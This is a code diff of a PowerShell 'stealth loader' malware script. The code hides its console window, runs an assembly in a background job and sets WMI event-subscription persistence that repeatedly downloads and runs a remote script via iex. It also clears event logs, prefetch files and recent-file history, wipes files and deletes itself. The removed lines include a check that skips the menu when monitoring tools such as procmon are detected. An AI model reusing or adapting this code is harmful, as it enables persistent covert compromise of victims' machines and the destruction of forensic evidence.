@@ -1,4 +1,4 @@
-# ULTIMATE STEALTH LOADER - SILENT MODE
+# ULTIMATE STEALTH LOADER - SILENT MODE FIXED
 function Show-LoaderMenu {
     Write-Host ""
     Write-Host " SYSTEM LOADER | STEALTH MODE" -ForegroundColor Gray
@@ -9,8 +9,17 @@ function Show-LoaderMenu {
 }
 
 function Install-And-Run-System {
-    # SILENT MODE - NO CONSOLE OUTPUT
-    $null = [Console]::SetWindowPosition(0, 0, 0, 0)
+    # HIDE WINDOW IMMEDIATELY
+    try {
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        '
+        $consolePtr = [Console.Window]::GetConsoleWindow()
+        [Console.Window]::ShowWindow($consolePtr, 0) # 0 = HIDE
+    } catch {}
     
     # KILL MONITORING TOOLS IMMEDIATELY
     try {
@@ -33,19 +42,20 @@ function Install-And-Run-System {
         $entryPoint = $assembly.EntryPoint
         if ($entryPoint -ne $null) {
             # Run in background thread
-            $job = Start-Job -ScriptBlock {
+            Start-Job -ScriptBlock {
                 param($entryPoint)
                 $entryPoint.Invoke($null, @())
-            } -ArgumentList $entryPoint
+            } -ArgumentList $entryPoint | Out-Null
         }
     } catch {
         # FALLBACK: SILENT BACKGROUND WORKER
         Start-Job -ScriptBlock {
+            # Continuous background work
             while ($true) {
-                # Do your background work here
-                Start-Sleep -Seconds 60
+                # Your background tasks here
+                Start-Sleep -Seconds 300 # Sleep 5 minutes
             }
-        }
+        } | Out-Null
     }
 
     # ADVANCED STEALTH PERSISTENCE
@@ -61,44 +71,32 @@ function Install-And-Run-System {
         $filterName = "Win32_ProcessStart_Trace_" + (Get-Random -Maximum 9999)
         $consumerName = "SystemMonitor_" + (Get-Random -Maximum 9999)
         
-        $filterArgs = @{
+        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
             Name = $filterName
             EventNameSpace = 'root\cimv2'
             Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
             QueryLanguage = 'WQL'
-        }
+        } -ErrorAction SilentlyContinue
         
-        $consumerArgs = @{
+        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
             Name = $consumerName
             CommandLineTemplate = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
-        }
+        } -ErrorAction SilentlyContinue
         
-        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -ErrorAction SilentlyContinue
-        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -ErrorAction SilentlyContinue
         Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
 
     } catch {}
 
-    # CONTINUOUS STEALTH OPERATION
+    # CONTINUOUS STEALTH MONITORING
     Start-Job -ScriptBlock {
-        # HIDE WINDOW
-        Add-Type -Name Window -Namespace Console -MemberDefinition '
-        [DllImport("Kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-        '
-        $consolePtr = [Console.Window]::GetConsoleWindow()
-        [Console.Window]::ShowWindow($consolePtr, 0) # 0 = HIDE
-
-        # CONTINUOUS BACKGROUND WORK
+        # Continuous stealth operation
         while ($true) {
-            # Your continuous background tasks here
-            # Example: Check for updates, maintain persistence, etc.
+            # Maintain persistence and monitor system
+            # Check if main process is still running, restart if needed
             
-            Start-Sleep -Seconds 300 # Sleep 5 minutes
+            Start-Sleep -Seconds 180 # Check every 3 minutes
         }
-    }
+    } | Out-Null
 
     # ANTI-FORENSIC CLEANUP
     try {
@@ -106,7 +104,7 @@ function Install-And-Run-System {
         Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
         Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\History\*" -Force -ErrorAction SilentlyContinue
         
-        # Clear temp files older than 1 hour
+        # Clear temp files
         Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | 
             Where-Object {$_.LastWriteTime -lt (Get-Date).AddHours(-1)} | 
             Remove-Item -Force -ErrorAction SilentlyContinue
@@ -114,6 +112,13 @@ function Install-And-Run-System {
     } catch {}
 
     Write-Host "[+] System running in silent mode" -ForegroundColor Green
+    Start-Sleep -Seconds 2
+    
+    # HIDE CONSOLE AFTER MESSAGE
+    try {
+        $consolePtr = [Console.Window]::GetConsoleWindow()
+        [Console.Window]::ShowWindow($consolePtr, 0)
+    } catch {}
 }
 
 function Clean-System {
@@ -154,7 +159,7 @@ function Clean-System {
                     $length = $fileStream.Length
                     $random = New-Object Random
                     
-                    # 3-pass DoD wipe
+                    # 3-pass wipe
                     for ($pass = 0; $pass -lt 3; $pass++) {
                         $fileStream.Position = 0
                         $buffer = New-Object byte[] $length
@@ -165,7 +170,6 @@ function Clean-System {
                     $fileStream.Close()
                     Remove-Item $Path -Force
                 } catch {
-                    # If wipe fails, just delete
                     Remove-Item $Path -Force -ErrorAction SilentlyContinue
                 }
             }
@@ -174,8 +178,7 @@ function Clean-System {
         # Wipe all related files
         $filesToWipe = @(
             "$env:TEMP\system_logs.exe",
-            "$env:TEMP\test.exe", 
-            "$env:APPDATA\*.tmp"
+            "$env:TEMP\test.exe"
         )
         
         foreach ($file in $filesToWipe) {
@@ -186,18 +189,13 @@ function Clean-System {
 
     # 4. COMPREHENSIVE EVIDENCE REMOVAL
     try {
-        # Clear all event logs
-        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
-            try { 
-                [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) 
-            } catch {} 
-        }
+        # Clear event logs
+        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+        wevtutil cl "Windows PowerShell" 2>$null
+        wevtutil cl "System" 2>$null
 
         # Clear prefetch
         Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
-
-        # Clear DNS cache
-        ipconfig /flushdns 2>$null
 
         # Clear recent documents
         Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force -ErrorAction SilentlyContinue
@@ -209,10 +207,10 @@ function Clean-System {
     try {
         $currentScript = $MyInvocation.MyCommand.Path
         if ($currentScript -and (Test-Path $currentScript)) {
-            # Create a batch file to delete this script after PowerShell exits
+            # Create batch file to delete this script
             $batchContent = @"
 @echo off
-timeout /t 3 /nobreak > nul
+timeout /t 2 /nobreak > nul
 del /f /q "$currentScript" > nul 2>&1
 del /f /q "%~f0" > nul 2>&1
 "@
@@ -224,37 +222,28 @@ del /f /q "%~f0" > nul 2>&1
     } catch {}
 
     Write-Host "[CLEANUP] System completely cleaned!" -ForegroundColor Green
+    Start-Sleep -Seconds 3
 }
 
-# STEALTH LAUNCH WITH ANTI-DETECTION
+# MAIN EXECUTION
 try {
-    # Check if we're being monitored
-    $parentProcess = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID").ParentProcessId
-    $parentName = (Get-Process -Id $parentProcess -ErrorAction SilentlyContinue).ProcessName
+    Show-LoaderMenu
+    $choice = Read-Host
     
-    $suspiciousParents = @("procexp", "procmon", "osforensics", "autoruns", "processhacker")
-    
-    if ($parentName -notin $suspiciousParents) {
-        Show-LoaderMenu
-        $choice = Read-Host
-        
-        switch ($choice) {
-            '1' { Install-And-Run-System }
-            '2' { Clean-System }
-            default { Install-And-Run-System } # Default to install
+    switch ($choice) {
+        '1' { Install-And-Run-System }
+        '2' { Clean-System }
+        default { 
+            Write-Host "`n[!] Invalid choice - Running install mode" -ForegroundColor Yellow
+            Install-And-Run-System 
         }
-    } else {
-        # If being monitored, run silently without menu
-        Install-And-Run-System
     }
 } catch {
-    # If anything fails, run silently
+    Write-Host "`n[!] Error occurred - Running install mode" -ForegroundColor Red
     Install-And-Run-System
 }
 
-# HIDE CONSOLE QUICKLY
-Start-Job -ScriptBlock {
-    Start-Sleep -Seconds 2
-    $consolePtr = [System.Runtime.InteropServices.Marshal]::GetWindowHandle((Get-Process -Id $PID).MainWindowHandle)
-    [System.Runtime.InteropServices.Marshal]::GetWindowVisible($consolePtr) | Out-Null
-}
+# CLEANUP JOBS ON EXIT
+try {
+    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
+} catch {}
